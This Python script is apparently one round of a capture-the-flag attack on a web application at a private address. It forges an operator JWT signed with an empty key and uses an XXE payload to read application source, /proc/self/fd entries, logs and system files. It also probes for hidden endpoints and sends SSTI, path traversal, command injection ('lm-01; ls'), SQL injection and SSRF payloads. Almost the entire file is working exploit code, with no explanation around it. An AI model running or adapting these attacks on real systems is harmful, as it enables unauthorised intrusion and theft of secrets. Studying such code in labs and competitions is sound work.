#!/usr/bin/env python3
"""round38 — Find diagnostics, SSTI via error handlers, Python file discovery, /proc/self/fd"""
import requests, time, json, hmac as hm, hashlib, base64, urllib.parse

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

# ============================================================
print("="*70)
print("PHASE 1: RE-READ GUNICORN.CONF.PY (FULL)")
print("="*70)

st, val = xxe_read("/app/gunicorn.conf.py")
print(f"  [{st}] Content:")
print(val)

# ============================================================
print("\n"+"="*70)
print("PHASE 2: FIND DIAGNOSTICS ENDPOINT")
print("="*70)

diag_paths = [
    "/api/ops/diagnostics", "/ops/diagnostics", "/api/diagnostics",
    "/diagnostics", "/api/ops/diag", "/api/ops/status", "/api/status",
    "/api/health", "/health", "/api/ops/health",
    "/api/ops/config", "/api/config", "/api/info", "/api/ops/info",
    "/api/ops/debug", "/debug", "/api/debug",
    "/api/ops/probe/config", "/api/ops/probe/status",
    "/api/ops/probe/info", "/api/ops/probe/health",
    "/api/ops/custody", "/api/ops/custody/list", "/api/ops/custody/tickets",
    "/api/ops/", "/api/", "/api/v1/", "/api/v2/",
    "/api/ops/probe/devices", "/api/ops/devices",
]

for path in diag_paths:
    try:
        r = requests.get(f"{CASPI}{path}", headers=AUTH_OP, timeout=5)
        if r.status_code != 404:
            content_type = r.headers.get('content-type','')
            print(f"  [{r.status_code}] {path} ({content_type[:30]}) {r.text[:120]}")
    except:
        pass

# ============================================================
print("\n"+"="*70)
print("PHASE 3: SSTI VIA ERROR HANDLERS")
print("="*70)

# Test if 404 error page renders URL path through Jinja2
ssti_urls = [
    "/{{7*7}}",
    "/{{'SSTI'}}",
    "/{{config}}",
    "/{{config.items()}}",
    "/test{{7*7}}test",
]

for path in ssti_urls:
    try:
        r = requests.get(f"{CASPI}{path}", timeout=5)
        if "49" in r.text and "{{7*7}}" not in r.text:
            print(f"  SSTI in 404! {path} → rendered!")
            print(f"  {r.text[:500]}")
        elif "SSTI" in r.text and "{{'SSTI'}}" not in r.text:
            print(f"  SSTI in 404! {path} → rendered!")
            print(f"  {r.text[:500]}")
        else:
            # Check if path appears in response at all
            if path.strip('/') in r.text:
                print(f"  [{r.status_code}] {path}: path echoed (check SSTI)")
    except:
        pass

# Test SSTI in probe device error
ssti_devices = ["{{7*7}}", "{{config}}", "{{config.items()}}"]
for device in ssti_devices:
    try:
        r = requests.get(f"{CASPI}/api/ops/probe/sign",
            params={"device": device}, headers=AUTH_OP, timeout=5)
        if r.status_code != 404:
            text = r.text[:200]
            if "49" in text or "Config" in text or "SECRET" in text.upper():
                print(f"  SSTI in probe! device={device}")
                print(f"    {text}")
            else:
                print(f"  [{r.status_code}] probe device={device}: {text}")
    except:
        pass

# ============================================================
print("\n"+"="*70)
print("PHASE 4: PYTHON FILE DISCOVERY")
print("="*70)

py_files = [
    "/app/__init__.py", "/app/wsgi.py", "/app/create_app.py",
    "/app/factory.py", "/app/routes.py", "/app/views.py",
    "/app/api.py", "/app/ops.py", "/app/probe.py",
    "/app/models.py", "/app/utils.py", "/app/helpers.py",
    "/app/config.py", "/app/settings.py", "/app/constants.py",
    "/app/middleware.py", "/app/decorators.py",
    # Subdirectories
    "/app/ops/__init__.py", "/app/ops/probe.py",
    "/app/ops/custody.py", "/app/ops/routes.py",
    "/app/api/__init__.py", "/app/api/routes.py",
    "/app/auth/__init__.py",
    "/app/blueprints/ops.py", "/app/blueprints/auth.py",
    "/app/blueprints/probe.py", "/app/blueprints/portal.py",
    # Common names
    "/app/extensions.py", "/app/errors.py", "/app/forms.py",
    "/app/services.py", "/app/services/__init__.py",
    "/app/core.py", "/app/main.py",
]

for fp in py_files:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"  [READABLE!] {fp}:")
        for line in val.split('\n')[:25]:
            print(f"    {line}")
    elif st == "BIN":
        print(f"  [EXISTS/BINARY] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 5: /proc/self/fd (FILE DESCRIPTORS)")
print("="*70)

for fd in range(25):
    st, val = xxe_read(f"/proc/self/fd/{fd}")
    if st == "OK" and val:
        preview = val[:100].replace('\n',' ')
        print(f"  fd/{fd}: [READABLE] {preview}")
    elif st == "BIN":
        print(f"  fd/{fd}: [EXISTS/BINARY]")
    elif st.startswith("E"):
        pass  # skip errors (broken pipes etc)

# ============================================================
print("\n"+"="*70)
print("PHASE 6: TEMPLATE FILES (for SSTI clues)")
print("="*70)

# Try to find Jinja2 template names
template_names = [
    "/app/templates/base.html", "/app/templates/index.html",
    "/app/templates/login.html", "/app/templates/register.html",
    "/app/templates/portal.html", "/app/templates/ops.html",
    "/app/templates/diagnostics.html", "/app/templates/404.html",
    "/app/templates/500.html", "/app/templates/error.html",
    "/app/templates/probe.html", "/app/templates/custody.html",
    "/app/templates/home.html", "/app/templates/layout.html",
]

for fp in template_names:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"  [READABLE!] {fp} ({len(val)} chars)")
        # Check if template has SSTI-vulnerable patterns
        if "render_template_string" in val or "safe" in val.lower() or "config" in val.lower():
            print(f"    INTERESTING: {val[:300]}")
    elif st == "BIN":
        print(f"  [EXISTS/BINARY] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 7: READ /etc/resolv.conf + MORE SYSTEM FILES")
print("="*70)

sys_files = [
    "/etc/resolv.conf",
    "/proc/self/comm",
    "/proc/1/comm",
    "/proc/self/loginuid",
    "/proc/self/sessionid",
    "/proc/self/oom_score",
    "/proc/self/oom_score_adj",
    "/proc/self/personality",
    # Maybe /var/log has something
    "/var/log/gunicorn/error.log",
    "/var/log/gunicorn/access.log",
    "/var/log/app.log",
    "/tmp/gunicorn.log",
    "/app/logs/app.log",
]

for fp in sys_files:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        preview = val[:200].replace('\n', ' | ')
        print(f"  {fp}: {preview}")
    elif st == "BIN":
        print(f"  [EXISTS/BINARY] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 8: PROBE ENDPOINT — EXTRA PARAMS & INFO LEAK")
print("="*70)

# Try to get info from probe endpoint with various params
for params in [
    {"device": "lm-01", "debug": "1"},
    {"device": "lm-01", "verbose": "true"},
    {"device": "lm-01", "format": "json"},
    {},  # no device
    {"device": ""},  # empty device
    {"device": ".."},
    {"device": "../../../etc/hostname"},
    {"device": "lm-01; ls"},
    {"device": "lm-01' OR '1'='1"},
]:
    try:
        r = requests.get(f"{CASPI}/api/ops/probe/sign",
            params=params, headers=AUTH_OP, timeout=5)
        if r.status_code != 404:
            print(f"  params={params}: [{r.status_code}] {r.text[:150]}")
    except:
        pass

# Also try POST to probe with different payloads
for payload in [
    {"url": "", "sig": ""},
    {"url": "http://127.0.0.1/", "sig": "a"*64},
    {"debug": True},
    {"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
     "sig": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09",
     "debug": True},
]:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe",
            json=payload, headers=AUTH_OP, timeout=5)
        if r.status_code != 404:
            print(f"  POST probe {list(payload.keys())}: [{r.status_code}] {r.text[:150]}")
    except:
        pass

print("\n"+"="*70)
print("DONE")
print("="*70)
